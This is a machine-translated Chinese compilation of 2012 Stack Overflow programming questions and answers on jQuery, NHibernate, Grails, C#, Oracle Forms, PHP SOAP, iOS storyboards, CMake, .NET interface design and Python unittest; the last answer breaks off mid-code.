# jquery - jQuery 中的 C++ memset() 等效项

> ID：13530851
> 
> 赞同：1
> 
> 时间：2012-11-23T14:15:05.700
> 
> 标签：jquery, c++, memset

我已经在 C++ 中工作过，`memset()`而且这个函数肯定不需要在这里介绍。现在我想知道`memset()`jQuery 中的等效函数是什么？我搜索了互联网但找不到任何东西。jquery中是否有任何等效功能？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-23T14:28:57.773

> 现在我想知道 jQuery 中的 memset() 等效函数是什么？

没有等效于`memset`. `memset`是一个低级 C 函数，其实现和接口依赖于您可以访问变量的地址和内存表示的事实。

这两个前提条件都不适用于 javascript。您可以实现将对象的内部设置为 null 和零（基于反射/元数据）的东西，但这是一个完全不同的问题。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-18T07:14:09.253

在 C++ 中，`memset()`是一个函数，可用于以简单、蛮力的方式初始化数组或其他对象。在使用 JavaScript 时，有些情况下您想做本质上相同的事情。

下面是一些如何定义此类函数的示例。当传递一个简单的数组时，每一行都会完成工作。其中一些可能也适用于其他对象类型。第一行 ( `jQuery.each`) 可能是最有效且通常有用的（假设您有 jQuery）。

```
function memset( object, value )
   {
   jQuery.each( object, function(i,v){ object[i]=value; } );
// jQuery(object).each( function(i,v){ object[i]=value; } );
// for ( var i=0; i<object.length; i++ ) object[i]=value;
// for ( var i in object ) object[Number(i)]=value;
   } 
```

与 C++ 一样，这`memset()`是一个低级操作，它的使用应该限于本质上是“[普通旧数据](http://en.wikipedia.org/wiki/Plain_old_data_structure)”的对象——简单的数组是主要的例子。

补充阅读：

*   [http://api.jquery.com/jQuery.each](http://api.jquery.com/jQuery.each)
*   [http://api.jquery.com/each](http://api.jquery.com/each)
*   [https://stackoverflow.com/a/1229010/86967](https://stackoverflow.com/a/1229010/86967)
*   [C++ 中的 POD 类型是什么？](https://stackoverflow.com/questions/146452/what-are-pod-types-in-c)

# asp.net - 带有 Web 服务的 ASP.NET，NHibernate 会话设计

> ID：13530853
> 
> 赞同：1
> 
> 时间：2012-11-23T14:15:09.133
> 
> 标签：asp.net, web-services, nhibernate, caching

我正在构建一个带有 WCF Web 服务后端的 ASP.NET MVC 网站，该后端通过 NHibernate 与数据库通信。目前，作为 POC，我有一个名为 UserService 的 Web 服务，其中包含我需要的所有方法。我遇到的问题是我有一个包装 NHibernate 配置的 DataRepository 对象。当我创建一个新的数据存储库对象时，它会加载 NHibernate 配置和映射以及缓存等。对于我在用户会话中的网站，我希望在他们的会话期间保持这个 DataRepository 对象打开，因为保持它没有意义在每次调用的基础上重新配置 NHibernate，我希望相同的数据存储库可用于所有 Web 服务方法，以从 NHibernate 缓存中受益。

这里的答案是在 UserService.cs 类级别创建一个静态 DataRepository 对象并将网站配置为基于每个会话进行实例化，这是否意味着每个用户会话在其会话的生命周期内都包含其自己的静态数据存储库对象？或者，还有更好的方法？上述方法有什么我没有想到的吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T14:27:43.373

我会建议一个更好的方法。不要共享存储库，共享hibernate的会话并使其可注入存储库。

```
 public class DataRepository {
     public DataRepository ( Session session ) {
     }
 } 
```

通过这种方式，您可以精确控制存储库和会话的生命周期。特别是，您可以拥有一个共享会话（在请求范围内），但始终创建​​一个新的（临时）存储库。

# xml - Grails HttpBuilder URL 编码 GET

> ID：13530856
> 
> 赞同：1
> 
> 时间：2012-11-23T14:15:25.987
> 
> 标签：xml, rest, grails, httpbuilder

我想与具有基于 URL 的 API 的 Web 服务通信。例如，我有以下网址：

[http://api.bla.com/aaa/bbb.ashx?Action=GetSecurityToken&vendorId=3](http://api.bla.com/aaa/bbb.ashx?Action=GetSecurityToken&vendorId=3)

我可以将 URL 放入浏览器并获取包含所有详细信息的 XML 页面。

我想从我的 grails 应用程序中获取 XML 页面，因此我使用以下代码：

```
http = new HTTPBuilder('http://api.bla.com/aaa/bbb.ashx')
html = http.get( path : '/', query : [Action :"GetSecurityToken", vendorId: "3"] ) )
println html 
```

为什么这不起作用。我收到一个错误的请求。如何在我的 grails 控制器中从上面的 URL 获取 xml 页面？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T15:11:48.947

我认为最终的网址将是[http://api.bla.com/aaa/bbb.ashx/?Action=GetSecurityToken&vendorId=3](http://api.bla.com/aaa/bbb.ashx/?Action=GetSecurityToken&vendorId=3)，因为您将基本网址定义为[http://api.bla.com/aaa/ bbb.ashx](http://api.bla.com/aaa/bbb.ashx)并将您的呼叫路径设置为`/`.

尝试更改您的基本网址，例如（取自[此](http://groovy.codehaus.org/modules/http-builder/doc/get.html)示例）：

```
def http = new HTTPBuilder('http://api.bla.com/aaa')
http.get( path : '/bbb.ashx',
          contentType : XML,
          query : [Action :"GetSecurityToken", vendorId: "3"] ) { resp, reader ->

  println "response status: ${resp.statusLine}"
  println 'Headers: -----------'
  resp.headers.each { h ->
    println " ${h.name} : ${h.value}"
  }
  println 'Response data: -----'
  System.out << reader
  println '\n--------------------'
} 
```

# c# - C# 目录不存在时出现错误

> ID：13530857
> 
> 赞同：1
> 
> 时间：2012-11-23T14:15:39.343
> 
> 标签：c#, file, directory, exists, filesysteminfo

正如标题所解释的，我有一个程序可以在继续之前检查目录是否存在。

当检查完成时，它说目录不存在！

这是存储目录路径的代码：

```
string currentDirectory = Path.GetDirectoryName(Application.ExecutablePath);
Console.WriteLine("----" + currentDirectory.ToString());
string tesseractPath = Path.Combine(currentDirectory, @"..\..\..\tesseract");
_wrapper = new AsyncTesseractWrapper(tesseractPath);

public TesseractWrapper(string programLoc)
{
    DirectoryInfo dinfo = new DirectoryInfo(programLoc);
    //DirectoryInfo dinfo = new DirectoryInfo("C:\\Windows");
    ValidateTesseractDirectory(dinfo);
    _tesseractLocation = dinfo.FullName;
} 
```

以及执行检查的代码：

```
private void ValidateTesseractDirectory(DirectoryInfo dinfo)
{
    if (!dinfo.Exists)               
        throw new ArgumentException("Specified program directory must exist.");
    FileInfo[] files;
    files = dinfo.GetFiles(_tessExe);
    if (files.Length != 1)
        throw new ArgumentException("Specified program directory must contain tesseract.exe.");
} 
```

我已经尝试使用几种变体进行调试，例如检查 C:\Windows 文件夹是否存在并且它仍然给我一个错误......

代码有问题，还是我对 .Exists 方法的理解有问题...？

谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-23T14:20:32.117

可能是因为权限问题。引用 MSDN：

> 如果在尝试确定指定文件是否存在时发生任何错误，Exists 属性将返回 false。这可能发生在引发异常的情况下，例如传递包含无效字符或过多字符的文件名、磁盘故障或丢失，或者调用者没有读取文件的权限。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-06-13T12:17:12.183

我认为问题在于微软已经改变了文件夹的结构，并且“显然”他们的员工仍在寻找“好的旧方式”。过去，一个文件夹曾经有“..”，这是“文件夹标记”（当然是 dos），我可以看到这不再存在。我做了什么：我将一个虚拟文件放入/复制到一个新文件夹、一个图像或其他任何东西中，而不是使用“目录”，我使用 file.exists 我认为答案可能在属性中。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2019-10-09T23:45:50.297

经历其实是一样的。这是由于使用软链接（包含有关文件夹信息的文本文件）而不是连接。

递归加载第一个文件夹，然后是它们的文件并修复错误的连接。长文件名等

```
public static List<string> GetFilesEveryFolder(string folder, string mask, SearchOption searchOption, bool _trimA1 = false)
{
    List<string> list = new List<string>(); ;
    List<string> dirs = null;

    try
    {
        dirs = GetFoldersEveryFolder(folder, "*").ToList();
    }
    catch (Exception ex)
    {
        throw new Exception("GetFiles with path: " + folder, ex);
    }

    foreach (var item in dirs)
    {
        try
        {
            list.AddRange(Directory.GetFiles(item, mask, SearchOption.TopDirectoryOnly));
        }
        catch (Exception ex)
        {
            // Not throw exception, it's probably Access denied on Documents and Settings etc
            //ThrowExceptions.FileSystemException(type, RH.CallingMethod(), ex);
        }
    }

    CA.ChangeContent(list, d => SH.FirstCharLower(d));

    if (_trimA1)
    {
        list = CA.ChangeContent(list, d => d = d.Replace(folder, ""));
    }
    return list;
} 
```

# architecture - 具有多架构的计算机是否可能？

> ID：13530860
> 
> 赞同：4
> 
> 时间：2012-11-23T14:15:52.650
> 
> 标签：architecture, x86, arm, processor

我只是想知道是否有一台包含 2 个物理处理器的计算机，每个处理器都有不同的架构。也许目标是实现一台同时利用这两种架构的计算机。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-23T14:22:11.367

这不仅是可能的，而且是非常真实的。带有图形卡的普通 PC 就是这种架构的一个例子。CPU 在其上运行操​​作系统和其他应用程序，而 GPU 则用于其更擅长的任务，例如大规模并行计算。一些应用程序，如最新版本的 Photoshop，将 CPU 和 GPU 之间的计算负载分开。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-23T15:13:52.533

PS3 就是一个实际的例子：Cell 处理器具有一个 PowerPC 内核 (PPE) 和六个“协同处理单元”(SPU)，具有针对 SIMD/矢量处理优化的完全不同的架构。Nintendo Wii 和 WiiU 还结合了两种架构：PowerPC 和 ARM。

现代 PC 主板通常（总是？）除了主 CPU 之外还有多个处理器。例如，笔记本电脑总是包含一个嵌入式控制器 (EC)——通常是一个 8051 内核。但即使在台式机上，英特尔芯片组也嵌入了一个带有 ARC 内核的管理引擎 (ME)，而 AMD 800 系列芯片组包括两个 8051。然后是各种外围设备，如 WiFi 控制器、网卡、显卡、USB 控制器、RAID 控制器等，它们内部也有一个 CPU（除了显卡，这些通常是基于 ARM 的，尽管 MIPS 也很常见在网卡中）。硬盘驱动器、键盘和鼠标也是如此。CPU无处不在！

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-23T14:19:43.627

我还没有听说过主板允许这样的事情。
我认为启动程序会有问题（必须指定运行哪个架构应用程序）。

# oracle - 如何从 Oracle Forms 的应用程序服务器读取文件？

> ID：13530862
> 
> 赞同：2
> 
> 时间：2012-11-23T14:15:58.640
> 
> 标签：oracle, oracleforms

我被要求在 Oracle Forms 中编写代码，从“中间件”（应用程序服务器）而不是客户端的文件中读取数据。目的是将加密密钥保存在人们不会偶然发现的地方。

我知道我可以使用 TEXT_IO 包在客户端读取文件，但是在另一端是否有类似于读取文件的东西？

版本详情：

> Forms [32 位] 版本 10.1.2.3.0 (Production) Oracle Toolkit Version 10.1.2.0.2 (Production) PL/SQL Version 10.1.0.5.0 (Production) Oracle Procedure Builder V10.1.2.3.0 - Production PL/SQL编辑器 (c) WinMain Software (www.winmain.com)，v1.0（生产）Oracle Query Builder 10.1.2.3.0 - 生产 Oracle 虚拟图形系统版本 10.1.2.0.2（生产）Oracle 工具 GUI 实用程序版本 10.1。 2.0.2（生产）Oracle Multimedia 版本 10.1.2.0.2（生产）Oracle 工具集成版本 10.1.2.0.2（生产）Oracle 工具公共区域版本 10.1.2.0.2 Oracle CORE 10.1.0.5.0
> 生产 SQL*Plus：版本 10.2.0.3.0 - 生产于 2012 年 11 月 22 日星期四 19:44:05 版权所有 (c) 1982, 2006，Oracle。版权所有。连接到：Oracle 数据库 11g 企业版版本 11.2.0.2.0 - 64 位生产，具有分区、真正应用程序集群、自动存储管理、OLAP、数据挖掘和真正应用程序测试选项

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-24T09:28:33.727

*TEXT_IO 从Forms 运行时的本地*目录中读取文件。在客户端/服务器模式下，这将是我们的桌面 PC，但在 Web 交付的表单中是应用程序服务器。

所以TEXT_IO其实就是你描述的场景需要用到的函数。

TEXT_IO 不能做的是读取或写入台式 PC 上的文件。这就是 Oracle 添加[Webutils 库](http://www.oracle.com/technetwork/developer-tools/forms/webutil-090641.html)以提供不再适用于 n 层架构的客户端功能的原因。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-23T21:08:14.717

我不确定我是否误解了您的问题，但您可以使用`TEXT_IO`它自己在“应用服务器”中读取和写入文件。我使用 Oracle Forms 10g，下面是 Forms Online Help 文档中的文本。

* * *

**关于 TEXT_IO**

包描述`TEXT_IO`包包含提供向文件写入和读取信息的方法的结构。Text_IO 中有几个过程和函数可用，分为以下几类：

**使用说明**

1.  Text_IO***在应用服务器机器上运行，而不是在客户端上运行***。
2.  一些 text_io 函数（ put、putf、put_line 和 new_line ）具有不将文件（file_type）参数作为第一个参数的重载版本。在 6i 和更早的版本中，除非您在调试模式下工作，否则这些功能无法运行，在这种情况下，它们会写入调试控制台。在 Oracle Forms 中，因为有一个不同的调试器没有控制台，所以这些内置插件的这些版本根本没有效果。这些内置插件是为了向后兼容，将在未来的版本中删除。
3.  要使 TEXT_IO 包使用非 ASCII 文件名，NLS_LANG 必须与平台的编码匹配。例如 JA16SJIS 用于 Windows 日语。

* * *

为了能够在客户端机器上读取和写入文件，您必须使用**WebUtil CLIENT_TEXT_IO**。

只需参考 Forms Developer Help Menu > Online Help 并搜索术语`TEXT_IO`，`CLIENT_TEXT_IO`您将看到详细信息。

* * *

但是，正如 Oracle 所记录的，必须牢记以下内容-

> 许多 Forms 应用程序利用 Text_IO 从文件系统读取和写入数据。将 Forms 应用程序移至 Web 时，Text_IO 的工作方式与客户端/服务器完全相同。但是，您现在必须记住，您的应用程序是在应用程序服务器而不是客户端计算机上运行的。

这是一个简单的[例子](http://www.oracle.com/technetwork/developer-tools/forms/howto-textio-092797.html)。

# c# - 打开没有vsto插件的excel

> ID：13530871
> 
> 赞同：4
> 
> 时间：2012-11-23T14:16:37.157
> 
> 标签：c#, vsto

不安装插件是否可以打开excel。

```
Workbook newWorkbook = application.Workbooks.Open(templatePath); 
```

当我运行此代码时，Excel 想要安装与 excel 文档相关的插件，但我不希望这样。

那么有没有办法关闭它？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-03T06:47:29.023

请参阅此示例代码..

这里 processControl 是 Process Type

```
System.Diagnostics.Process processControl = new System.Diagnostics.Process();
 processControl.StartInfo.FileName="C:\\Program Files\\Microsoft Office\\Office12\\EXCEL.exe";
 processControl.Start(); 
```

# php - 将php异常（soap故障）转换为特定的类

> ID：13530872
> 
> 赞同：4
> 
> 时间：2012-11-23T14:16:41.837
> 
> 标签：php, web-services, soap, casting

我在将 php 异常转换为泛型类时遇到问题。

我正在调用一个 Web 服务方法，当它失败时，它会返回一个带有“详细标签”中的信息的肥皂故障。如果我使用 Soap UI (http://soapui.org) 调用 Web 服务方法，结果如下所示：

```
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
   <s:Body>
      <s:Fault>
         <faultcode>s:Client</faultcode>
         <faultstring xml:lang="sv-SE">Error Posting New Sponsor Full to Middleware</faultstring>
         <detail>
            <MyPlanWSError xmlns="http://schemas.datacontract.org/2004/07/MyPlanPOA" xmlns:i="http://www.w3.org/2001/XMLSchema-instance">
               <BadParameters i:nil="true"/>
               <Details>2 duplicate(s) detected</Details>
               <Duplicates>
                  <DuplicateInfo>
                     <DuplicatedExtRelNo>0</DuplicatedExtRelNo>
                     <POAStatus>New</POAStatus>
                     <Source>NewExtRels</Source>
                     <SourceRecordID>194</SourceRecordID>
                     <Type>eMail</Type>
                  </DuplicateInfo>
                  <DuplicateInfo>
                     <DuplicatedExtRelNo>0</DuplicatedExtRelNo>
                     <POAStatus>New</POAStatus>
                     <Source>NewExtRels</Source>
                     <SourceRecordID>194</SourceRecordID>
                     <Type>Address</Type>
                  </DuplicateInfo>
               </Duplicates>
               <ErrorNumber>7</ErrorNumber>
            </MyPlanWSError>
         </detail>
      </s:Fault>
   </s:Body>
</s:Envelope> 
```

我想获取“详细信息”标签中的 MyPlanWSError 内容。我想将其转换为 php 类。

我使用了很好的工具 wsdl2php (http://www.urdalen.no/wsdl2php) 来生成基于 wsdl 文件的帮助类，这样我就不必自己编写所有代码了 :) 该工具生成了 MyPlanWSError看起来像这样：

```
class MyPlanWSError
{
  public $BadParameters;
  public $Details;
  public $Duplicates;
  public $ErrorNumber;
  public function __construct($BadParameters, $Details, $Duplicates, $ErrorNumber)
  {
    $this->BadParameters = $BadParameters;
    $this->Details = $Details;
    $this->Duplicates = $Duplicates;
    $this->ErrorNumber = $ErrorNumber;
  }
} 
```

当我调用 Web 服务方法（返回肥皂错误）时，我在 try catch 子句中执行此操作：

```
function add_new_sponsor() {
  // ... code
  try {
    $new_sponsor = new PostNewSponsor(
        $accessKey,
        $type,
        $initialRecordStatus,
        $monthlyAmount,
        $categoryCode,
        $titleCode,
        $firstName,
        $lastName,
        $organisationName,
        $street,
        $houseNumber,
        $apartment,
        $extraAddressLine,
        $postCode,
        $town,
        $countryISOCode,
        $privatePhone,
        $mobilePhone,
        $workPhone,
        $eMailAddress,
        $sourceCode,
        $paymentFrequencyCode,
        $paymentTypeCode,
        $numberOfChildren,
        $scGender,
        $continentCode,
        $scCountryISOCode,
        $olderChildFlag,
        $personalID,
        $AddressTypeCode,
        $extRelNo,
        $comments,
        $iPAddress);

    $result = plan_utils_post_sponsor($new_sponsor);
  } catch (Exception $e) {
    echo 'Exception->detail var_dump: <br/>';
    var_dump($e->detail);
    echo '<br/></br>';

    $myplan_error = cast('MyPlanWSError', $e->detail);
    echo 'MyPlanWSError var_dump <br/>';
    var_dump($myplan_error);
    echo '<br/><br/>';

    echo 'MyPlanWSError->Details var_dump <br/>';
    var_dump($myplan_error->Details);
    echo '<br/><br/>';
  }
}

function cast($destination, $sourceObject)
{
    if (is_string($destination)) {
        $destination = new $destination();
    }
    $sourceReflection = new ReflectionObject($sourceObject);
    $destinationReflection = new ReflectionObject($destination);
    $sourceProperties = $sourceReflection->getProperties();
    foreach ($sourceProperties as $sourceProperty) {
        $sourceProperty->setAccessible(true);
        $name = $sourceProperty->getName();
        $value = $sourceProperty->getValue($sourceObject);
        if ($destinationReflection->hasProperty($name)) {
            $propDest = $destinationReflection->getProperty($name);
            $propDest->setAccessible(true);
            $propDest->setValue($destination,$value);
        } else {
            $destination->$name = $value;
        }
    }
    return $destination;
} 
```

cast 方法取自 //http://stackoverflow.com/questions/3243900/convert-cast-an-stdclass-object-to-another-class。

所以我期望输出来自`var_dump($myplan_error->Details)`is`"2 duplicate(s) detected"`但我得到的是`NULL`:(

这是 catch 子句的全部输出：

```
Exception->detail var_dump:
object(stdClass)#4 (1) { ["MyPlanWSError"]=> object(stdClass)#5 (4) { ["BadParameters"]=> NULL ["Details"]=> string(23) "2 duplicate(s) detected" ["Duplicates"]=> object(stdClass)#6 (1) { ["DuplicateInfo"]=> array(2) { [0]=> object(stdClass)#7 (5) { ["DuplicatedExtRelNo"]=> string(1) "0" ["POAStatus"]=> string(3) "New" ["Source"]=> string(10) "NewExtRels" ["SourceRecordID"]=> string(3) "194" ["Type"]=> string(5) "eMail" } [1]=> object(stdClass)#8 (5) { ["DuplicatedExtRelNo"]=> string(1) "0" ["POAStatus"]=> string(3) "New" ["Source"]=> string(10) "NewExtRels" ["SourceRecordID"]=> string(3) "194" ["Type"]=> string(7) "Address" } } } ["ErrorNumber"]=> string(1) "7" } }

MyPlanWSError var_dump
object(MyPlanWSError)#3 (5) { ["BadParameters"]=> NULL ["Details"]=> NULL ["Duplicates"]=> NULL ["ErrorNumber"]=> NULL ["MyPlanWSError"]=> object(stdClass)#5 (4) { ["BadParameters"]=> NULL ["Details"]=> string(23) "2 duplicate(s) detected" ["Duplicates"]=> object(stdClass)#6 (1) { ["DuplicateInfo"]=> array(2) { [0]=> object(stdClass)#7 (5) { ["DuplicatedExtRelNo"]=> string(1) "0" ["POAStatus"]=> string(3) "New" ["Source"]=> string(10) "NewExtRels" ["SourceRecordID"]=> string(3) "194" ["Type"]=> string(5) "eMail" } [1]=> object(stdClass)#8 (5) { ["DuplicatedExtRelNo"]=> string(1) "0" ["POAStatus"]=> string(3) "New" ["Source"]=> string(10) "NewExtRels" ["SourceRecordID"]=> string(3) "194" ["Type"]=> string(7) "Address" } } } ["ErrorNumber"]=> string(1) "7" } }

MyPlanWSError->Details var_dump
NULL 
```

所以看来问题是我无法成功地将其转换`$e>detail`为一个`MyPlanWSError`类。

有任何想法吗？:)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T14:26:36.353

看起来您正在尝试转换细节对象，而不是 MyPlanWSError 对象。因此，它的属性不匹配，并且生成的对象具有所有空值。

试试这个，它应该可以正常工作：

```
$myplan_error = cast('MyPlanWSError', $e->detail->MyPlanWSError); 
```

# xcode - 切换到横向时更改情节提要

> ID：13530875
> 
> 赞同：1
> 
> 时间：2012-11-23T14:16:48.867
> 
> 标签：xcode, ipad, orientation

当用户在 AppDelegate.m 文件中切换到横向到纵向模式时，有没有办法更改情节提要我已经为不同的 iOS 切换到不同的情节提要，但我无法从横向切换到纵向模式我已经构建了一个名为`iPadios5landscape`我正在使用这种方法切换到情节提要`mainStoryboard = [UIStoryboard storyboardWithName:@"iPadios5landscape" bundle:nil];`但我不知道检测方向的方法。重要的是把它放在这段代码中

```
if (SYSTEM_VERSION_GREATER_THAN_OR_EQUAL_TO(@"6.0")==NO)
    {

            if (iOSDeviceScreenSize.height == 480)
            {

                mainStoryboard = [UIStoryboard storyboardWithName:@"MainStoryboard_iPhone_ios5" bundle:nil];
            }

            if (iOSDeviceScreenSize.height == 1024)
{
    UIInterfaceOrientation orientation = [UIApplication sharedApplication].statusBarOrientation;
    if(orientation == 0) //Default orientation
        //UI is in Default (Portrait) -- this is really a just a failsafe.
        mainStoryboard = [UIStoryboard storyboardWithName:@"MainStoryboard_iPad_ios5" bundle:nil];

        else if(orientation == UIInterfaceOrientationPortrait)
            //Do something if the orientation is in Portrait
            mainStoryboard = [UIStoryboard storyboardWithName:@"MainStoryboard_iPad_ios5" bundle:nil];

            else if(orientation == UIInterfaceOrientationLandscapeLeft)
                // Do something if Left
                mainStoryboard = [UIStoryboard storyboardWithName:@"iPadios5landscape" bundle:nil];

                else if(orientation == UIInterfaceOrientationLandscapeRight)
                    //Do something if right
                    mainStoryboard = [UIStoryboard storyboardWithName:@"iPadios5landscape" bundle:nil];

                    } 
```

这可能吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T14:51:07.897

将其粘贴在那里以检测方向，然后设置情节提要`deviceOrientation`是横向还是纵向

```
 UIInterfaceOrientation orientation = [UIApplication sharedApplication].statusBarOrientation;
if(orientation == 0) //Default orientation 
    //UI is in Default (Portrait) -- this is really a just a failsafe. 
 else if(orientation == UIInterfaceOrientationPortrait)
    //Do something if the orientation is in Portrait
else if(orientation == UIInterfaceOrientationLandscapeLeft)
    // Do something if Left
else if(orientation == UIInterfaceOrientationLandscapeRight)
    //Do something if right 
```

# c - 在 CMake 项目中指定项目依赖项

> ID：13530876
> 
> 赞同：1
> 
> 时间：2012-11-23T14:16:50.417
> 
> 标签：c, cmake

我刚刚开始在 C 项目上使用 CMake 进行构建。

我的项目目录结构如下所示：

```
MainProject
   module1/
        src/
        include/
        CMakeLists.txt
   module1/
        src/
        include/
        CMakeLists.txt

....
   moduleN/
        src/
        include/
        CMakeLists.txt 
```

目前，我正在正确构建我的模块，但是，我现在希望能够指定模块间的依赖关系，以便在我创建一个模块时，它的所有依赖模块都被重建（如果更改）。

我的 CMakeLists.txt 文件通常如下所示：

```
CMAKE_MINIMUM_REQUIRED(VERSION 2.8)

PROJECT( basetypes )
FIND_PACKAGE( Threads )
SET(CMAKE_C_FLAGS ${CMAKE_C_FLAGS} "-pthread")  
ADD_DEFINITIONS(-DE4C_THREADSAFE )

INCLUDE_DIRECTORIES ("include/")

SET( basetypes_SRCS
     src/btypes_1.c  
     src/btypes_2.c  
     src/btypes_3.c   
     src/btypes_4.c   
     src/btypes_5.c  
     src/vfuncs.c
     src/btypes_6.c    
     src/btypes_7.c   
     src/btypes_8.c  
     src/btypes_8.c  
     src/e4c.c )

ADD_LIBRARY(basetypes SHARED ${basetypes_SRCS})

set(CMAKE_LIBRARY_OUTPUT_DIRECTORY "bin/") 
```

如何修改这样的 CMakeLists 文件以指定其他依赖项目？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T14:37:23.210

Try [`target_link_libraries`](http://cmake.org/cmake/help/v2.8.8/cmake.html#command%3atarget_link_libraries) command. However, it need to know module names, so I've suggest you to write one globale CMakeLists file, that include modules by [`add_subdirectory`](http://cmake.org/cmake/help/v2.8.8/cmake.html#command%3aadd_subdirectory) command.

# .net - 如果我有一个返回不同列表的方法，我应该让它返回 ISet 而不是 IEnumerable

> ID：13530879
> 
> 赞同：3
> 
> 时间：2012-11-23T14:17:06.183
> 
> 标签：.net, set

我有一个方法可以选择不同的对象集合，将它们添加到列表中，然后返回列表。

最初该方法返回 IEnumerable 但由于它返回一个不同的集合，我可以将不同的对象添加到一个哈希集中并返回 ISet 。

我很欣赏 ISet 使返回的对象可修改（消费者可以 Add() 到它），但无论如何我都会返回一个新列表，所以我认为这不会影响我，为什么我要关心消费者对集合做了什么一次他们有吗？

问题是，我应该这样做吗？或者我应该只返回 IEnumerable 并且很高兴它只包含不同的元素（目前由测试保证）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-27T09:52:41.653

与以往一样，对于设计，您在这里有相互矛盾的要求。优秀设计的艺术是为您正在创建的产品选择这些要求之间的最佳平衡。

界面设计的一个原则是您将界面视为合同或承诺。很明显，承诺或合同的规定性越低，就越容易遵守。因此，返回类型 of`IEnumerable<T>`意味着您承诺只返回一系列事物。“更严格”或更多派生的类型将更具规范性，并且更难兑现承诺。

反思一下，如果您在函数中进行工作以确保返回类型更加衍生，那么通过返回较少说明性的父类型来放弃这项工作似乎是浪费。如果您已经有一个`ISet<T>`，定义一组事物，请明确，返回它并将调用者保存为不同检查的工作。

一般来说，没有简单的答案，正确的答案取决于调用者和您的系统。在一般情况下，我们不知道调用者。在没有证据的情况下，我们必须什么都不做，并从较弱的承诺中获得实实在在的好处。因此，总的来说，使用`IEnumerable<T>`它可以为您在未来提供更大的灵活性，而现在没有已知的成本。

在特定情况下，我们知道调用者将从集合的返回中受益。这是您在序列的独特性上引发错误的情况。显式并返回一个 是有意义的`ISet<T>`，这将有助于防止重复检查。需要注意的是，只有当每个可能的调用的数据都是不同的时，这才有意义。您必须确保您将信守对所有调用者的承诺，而不仅仅是那些提出错误的人。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-27T11:13:45.170

在方法返回一系列唯一元素的情况下，为什么要查看您的问题的一个原因是“通过示例”返回类型应该是什么？

BCL 包括这样一种方法（您声明您正在使用），即`Enumerable.Distinct<T>`

该方法的返回类型是 IEnumerable。那么，为什么要使用一种不会自我投射实现将保持的所有承诺的类型呢？我可以看到两个论点

*   从方法的名称和意图很明显
*   IEnumerable 契约更容易实现，比如 ISet，并且在大多数情况下会提供消费者需要的东西，并且在消费者可以创建 ISet 还不够的情况下。这就是为什么只有在获得价值时才需要成本的原因。

接口 IDistinctEnumerable 会改变这些吗？接口提供的唯一信息是名称。类型系统可以确保序列中的元素在运行时是唯一的，但因为它只是名称与我用于 Distinct 的参数本质上相同。如果从外部看，该方法期望返回一个集合，那么这很可能会永远保持下去，然后返回一个集合可能是值得的。然而，一系列独特的元素和一个集合之间是有区别的。

# python - eval() 的奇怪行为破坏了 unittest

> ID：13530880
> 
> 赞同：-1
> 
> 时间：2012-11-23T14:17:08.777
> 
> 标签：python, unit-testing

我一直在制作原型，并不介意分配了一个变量的低质量代码，该变量通过在 argv 上调用 eval() 获取其值，而后者又在包含 API 密钥的外部文件中获取其值。令我惊讶的是，它严重崩溃了单元测试（它们甚至都没有运行）。

这是我认为是罪魁祸首的代码片段：

```
from sys import argv
from apikeys import *

def setKey(the_key=DCK):
    global CK
    CK = the_key # Currently used key

if len(argv) == 1:
    print('---Executing script. Enter optional arguments if you wish to use special API keys.---')
    setKey()
elif len(argv) > 1:
    setKey(eval(argv[1]))

TOKEN = rget(DOMAIN+'signin', params={'key':CK}).json['response']['token']
PARAMS = {'signature':TESTSIG, 'token':TOKEN}

# Rest of the code uses unittests which rely on PARAMS. 
```

因此，我将包含 key 的变量之一作为它的值传递给测试我的脚本，它会产生以下回溯：

```
[gp@imdev1 dv1/tests]# python 2test_api2.py ANDROID_FILMS_KEY
Traceback (most recent call last):
  File "2test_api2.py", line 604, in <module>
    unittest.main()
  File "/usr/lib/python2.6/site-packages/unittest2/main.py", line 97, in __init__
    self.parseArgs(argv)
  File "/usr/lib/python2.6/site-packages/unittest2/main.py", line 152, in parseArgs
    self.createTests()
  File "/usr/lib/python2.6/site-packages/unittest2/main.py", line 161, in createTests
    self.module)
  File "/usr/lib/python2.6/site-packages/unittest2/loader.py", line 148, in loadTestsFromNames
    suites = [self.loadTestsFromName(name, module) for name in names]
  File "/usr/lib/python2.6/site-packages/unittest2/loader.py", line 142, in loadTestsFromName
    raise TypeError("don't know how to make test from: %s" % obj)
TypeError: don't know how to make test from: 9b269ac759211de6b3c8b238bd758ccf 
```

9b269ac759211de6b3c8b238bd758ccf 基本上是运行 eval(ANDROID_FILMS_KEY) 并在单独的脚本中运行 setKey 函数的结果，将 API 密钥正确分配给 CK 作为字符串 '9b269ac759211de6b3c8b238bd758ccf'

问题如下：当 CK 和 PARAMS 用于包含应该进行单元测试的方法的类中时，Python 出人意料地引发了一个奇怪的异常，据说该异常告诉 unittest 不认为 9b269ac759211de6b3c8b238bd758ccf 是一个字符串？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-23T14:22:12.037

`unittest2`加载器还*检查*，`sys.argv`让您限制[从命令行](http://www.voidspace.org.uk/python/articles/unittest2.shtml#command-line-behaviour)加载的模块进行测试。

这里发生的是加载器正在寻找一个名为`9b269ac759211de6b3c8b238bd758ccf`.

您将不得不`sys.argv`从您的单元测试中进行操作；这是您可以更改的标准 python 列表。或者，创建一个`main(args)`默认情况下调用的函数`sys.argv[1:]`：

```
def main(args):
    if not args:
